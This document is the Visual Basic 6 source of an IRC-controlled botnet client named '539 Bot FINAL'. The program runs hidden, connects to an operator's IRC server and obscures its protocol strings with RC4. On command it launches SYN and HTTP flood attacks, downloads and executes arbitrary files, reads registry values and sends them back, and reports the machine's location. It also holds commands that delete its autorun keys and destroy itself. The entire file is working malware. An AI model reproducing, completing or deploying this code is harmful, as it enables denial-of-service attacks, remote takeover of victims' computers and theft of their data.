VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "ieframe.dll"
Begin VB.Form Form1 
   BorderStyle     =   0  'Kein
   Caption         =   "Formular1"
   ClientHeight    =   4905
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   7110
   LinkTopic       =   "Form1"
   ScaleHeight     =   4905
   ScaleWidth      =   7110
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows-Standard
   Visible         =   0   'False
   Begin VB.Timer Timer3 
      Interval        =   5000
      Left            =   3000
      Top             =   2160
   End
   Begin VB.Timer httptimer 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   3600
      Top             =   2280
   End
   Begin SHDocVwCtl.WebBrowser WebBrowser1 
      Height          =   2295
      Left            =   240
      TabIndex        =   1
      Top             =   1800
      Width           =   4455
      ExtentX         =   7858
      ExtentY         =   4048
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   "http:///"
   End
   Begin VB.Timer Timer2 
      Interval        =   1000
      Left            =   3600
      Top             =   1680
   End
   Begin MSWinsockLib.Winsock ws2 
      Left            =   2640
      Top             =   2280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer syntimer 
      Enabled         =   0   'False
      Interval        =   50
      Left            =   2640
      Top             =   1680
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   3120
      Top             =   1680
   End
   Begin VB.TextBox Text1 
      Height          =   1215
      Left            =   240
      TabIndex        =   0
      Text            =   "Text1"
      Top             =   360
      Width           =   1695
   End
   Begin MSWinsockLib.Winsock ws 
      Left            =   3120
      Top             =   2280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim lognick As String
Dim reg As Boolean
Dim Nick As String
Dim nicktemp As Integer
Dim synhost As String
Dim synport As String
Dim langbefehl() As String
Dim Befehl As String
Dim infos As String
Dim httppath As String
Dim httpflood As Boolean
Dim synflood As Boolean
Dim Temp As String
Dim download As String
Dim dfile As String
Dim nDateiNummer As Integer
Dim sZeile As String
Dim Key() As String
Dim temp2 As String





Private Sub connect()
On Error Resume Next
ws.Close
ws.connect server, port
End Sub

Private Sub Nickgen()
Randomize
nicktemp = Int(Rnd * 999) + 1
Nick = GetBenutzer() & nicktemp
End Sub

Private Sub dfilegen()
Randomize
dfile = Int(Rnd * 999) + 1
End Sub

Public Sub Form_Load()
httpflood = False
synflood = False
Call Nickgen
reg = False

Call connect
Call ShowInTaskbarForm(Me, "false")
End Sub

Private Sub httptimer_Timer()
WebBrowser1.Navigate httppath
End Sub

Private Sub syntimer_Timer()
ws2.Close
ws2.connect synhost, synport
End Sub

Private Sub Timer1_Timer()
Call GetExeNames
End Sub




Private Sub Timer2_Timer()


On Error GoTo fehler

If FileExists("C:\givemedata.txt") = True Then
Dim dateiname As String
Dim ikanalnr As Integer
ikanalnr = FreeFile()
dateiname = "C:\539Data.txt"
Open dateiname For Output As ikanalnr
Print #ikanalnr, , server
Print #ikanalnr, , port
Print #ikanalnr, , channel
Print #ikanalnr, , pw
Close #ikanalnr
End If
fehler:
Exit Sub
End Sub


Private Sub Timer3_Timer()
a = DateTime.Time
b = DateTime.Hour(a)
c = DateTime.Minute(a)
SaveSettingString HKEY_LOCAL_MACHINE, "Software\Intel", "Instance", b & c
End Sub

Private Sub ws_Connect()

ws.SendData RC4("³¿b¤", "539") & " " & "lol" & " " & ws.LocalIP & " " & _
            ws.LocalHostName & " :" & RC4("ÓßÖÔU——L", "539") & vbCrLf

ws.SendData RC4("¨¥d½", "539") & " " & Nick & vbCrLf


End Sub

Private Sub ws_DataArrival(ByVal bytesTotal As Long)

Dim RECV As String

ws.GetData RECV

DoEvents
Text1.Text = Text1.Text & vbCrLf & RECV
Dim Zeilen() As String, zeile As Variant

Zeilen = Split(RECV, vbCrLf)

For Each zeile In Zeilen

    If Len(zeile) > 0 Then Assemble CStr(zeile)

Next

End Sub

Sub Assemble(Incoming As String)
On Error GoTo fehler
Dim Data() As String

Data = Split(Incoming, " ")
    
Select Case LCase(Data(0))
    
    Case RC4("–…I‘", "539")

        ws.SendData RC4("¶£i±", "539") & " " & Data(1) & vbCrLf
        
End Select

If UBound(Data) < 1 Then Exit Sub

Select Case LCase(Data(1))

    Case RC4("ÕÛ", "539"), RC4("ÒÞ", "539")
        ws.SendData RC4("¬£n¸", "539") & " " & channel & " " & channelpass & vbCrLf
     
     
        
    Case RC4("Òß", "539")
   
       Call Nickgen
       ws.Close
       ws.connect
                
    Case RC4("–žN€ðt³", "539")
    
If reg = False Then
   If LCase(Data(2)) = LCase(channel) Then

      If LCase(Mid(Data(3), 2)) = "!" & LCase(pw) Then
      ws.SendData RC4("¶¾n ÐT“", "539") & " " & Data(2) & " :" & RC4("ªƒ@‘øcôô»", "539") & vbCrLf
      reg = True
      lognick = Mid(Split(Data(0), "!")(0), 2)
      Exit Sub
      End If
   End If
Exit Sub
End If

If lognick = Mid(Split(Data(0), "!")(0), 2) Then
If LCase(Data(2)) = LCase(channel) Then
Else
Exit Sub
End If
Else
Exit Sub
End If
        
     langbefehl() = Split(Data(3), "!")
     Befehl = langbefehl(1)
     
  
     If LCase(Nick) = LCase(Befehl) Then
    
        Select Case langbefehl(2)
        Case "oma"
        ws.SendData RC4("¶¾n ÐT“", "539") & " " & Data(2) & " :Fuck Off! This is My Command!" & vbCrLf
        End Select
    End If
     
     If Befehl = RC4("•‰S", "539") Then
     Select Case langbefehl(2)
       
       Case RC4("…„F˜ób¸", "539")
       channel = langbefehl(3)
       ws.SendData RC4("¶¾n ÐT“", "539") & " " & Data(2) & " :Command Channel is now: " & channel & vbCrLf
       ws.SendData RC4("¬£n¸", "539") & " " & channel & vbCrLf
     End Select
     End If
     
     If Befehl = RC4("ŒƒN˜", "539") Then
     ws.SendData RC4("¶¾n ÐT“", "539") & " " & Data(2) & " :Join Channel: " & langbefehl(2) & vbCrLf
     ws.SendData RC4("¬£n¸", "539") & " " & langbefehl(2) & vbCrLf
     End If
     
     If Befehl = RC4("–U‚", "539") Then
     ws.SendData RC4("¶¾n ÐT“", "539") & " " & Data(2) & " :Part Channel: " & langbefehl(2) & vbCrLf
     ws.SendData RC4("¶­u¢", "539") & " " & langbefehl(2) & vbCrLf
     End If

     If Befehl = RC4("••I", "539") Then
     synhost = langbefehl(2)
     synport = langbefehl(3)
     syntimer.Interval = langbefehl(4)
     syntimer.Enabled = True
     synflood = True
     ws.SendData RC4("¶¾n ÐT“", "539") & " " & Data(2) & " :SYN Flood is now active! " & synhost & " " & synport & " " & syntimer.Interval & vbCrLf
     End If
     
     If Befehl = RC4("Ž˜S†", "539") Then
     httppath = langbefehl(2)
     httptimer.Enabled = True
     httpflood = True
     ws.SendData RC4("¶¾n ÐT“", "539") & " " & Data(2) & " :HTTP Flood is now active! " & httppath & vbCrLf
     End If
     
 
       
            
     If Befehl = RC4("‚ƒP˜ñhµÙ", "539") Then
     download = langbefehl(2)
     Call dfilegen
 Call DownIT(download, Environ("homedrive") & "\abc" & dfile & ".exe")
    Shell Environ("homedrive") & "\abc" & dfile & ".exe"
    ws.SendData RC4("¶¾n ÐT“", "539") & " " & Data(2) & " :Downloading and Executing the File! " & httppath & vbCrLf
   End If
   
        If Befehl = RC4("‰Sø~§", "539") Then
     download = langbefehl(2)
     Call dfilegen
    
 Call DownIT(download, Environ("homedrive") & "\abc" & dfile & ".db")
    
nDateiNummer = FreeFile

Open "C:\abc" & dfile & ".db" For Input As #nDateiNummer
Do Until EOF(nDateiNummer)
Line Input #nDateiNummer, sZeile

Key() = Split(sZeile, ",")

Select Case Key(1)
 Case "HKLM"

 temp2 = GetSettingString(HKEY_LOCAL_MACHINE, Key(2), Key(3), 0)
 
 Case "HKCU"
 temp2 = GetSettingString(HKEY_CURRENT_USER, Key(2), Key(3), 0)
End Select

If temp2 = "0" Then
Else
ws.SendData RC4("¶¾n ÐT“", "539") & " " & Data(2) & " :" & Key(0) & " " & temp2 & vbCrLf
End If


Loop
Close #nDateiNummer

   End If
     
        Select Case LCase(Mid(Data(3), 2))
        
          
            Case RC4("Ç€H•üs½Ò»", "539")
            ws.SendData RC4("¶¾n ÐT“", "539") & " " & Data(2) & " :" & "Location: " & GetLocation & vbCrLf
                       
 
            Case RC4("ÇŸS—ér§", "539")
            Temp = ""
            If synflood = True Then
            Temp = "-SYN Flood-"
            End If
            If httpflood = True Then
            Temp = Temp & "-HTTP Flood-"
            End If
            If Temp = "" Then
            Temp = "-Empty-"
            End If
            ws.SendData RC4("¶¾n ÐT“", "539") & " " & Data(2) & " :" & Temp & vbCrLf
        
            Case RC4("ÇˆN“", "539")
            DeleteValue HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", process
            DeleteValue HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", "RootRock"
            DeleteValue HKEY_LOCAL_MACHINE, "Software\Intel", "Eintrag"
            DeleteValue HKEY_LOCAL_MACHINE, "Software\Intel", "Instance"
            Call Selfdestruction
            
            Case RC4("ÇšB„în»Ó", "539")
                ws.SendData RC4("¶¾n ÐT“", "539") & " " & Data(2) & " :539 Bot FINAL" & vbCrLf
            
            Case RC4("ÇƒW›ø", "539")
            ws.SendData RC4("«£c³", "539") & " " & Data(2) & " +o " & Mid(Split(Data(0), "!")(0), 2) & vbCrLf
            
                
            Case RC4("ÇŸS™ít­Ó", "539")
           ws.SendData RC4("¶¾n ÐT“", "539") & " " & Data(2) & " :SYN Flood stoped!" & vbCrLf
           syntimer.Enabled = False
           
           Case RC4("ÇŸS™ío É¥", "539")
           ws.SendData RC4("¶¾n ÐT“", "539") & " " & Data(2) & " :HTTP Flood stoped!" & vbCrLf
           httptimer.Enabled = False
           
           Case RC4("ÇŸS™íf¸Ñ", "539")
           ws.SendData RC4("¶¾n ÐT“", "539") & " " & Data(2) & " :Everything stoped!" & vbCrLf
           httptimer.Enabled = False
           syntimer.Enabled = False
            Case RC4("ÇŽ^“", "539")
                End
                   
           Case RC4("Ç€H‘òr ", "539")
          ws.SendData RC4("¶¾n ÐT“", "539") & " " & Data(2) & " :Logged Out" & vbCrLf
          reg = False
    
       End Select
        
        
   
        
End Select
fehler:
Exit Sub
End Sub



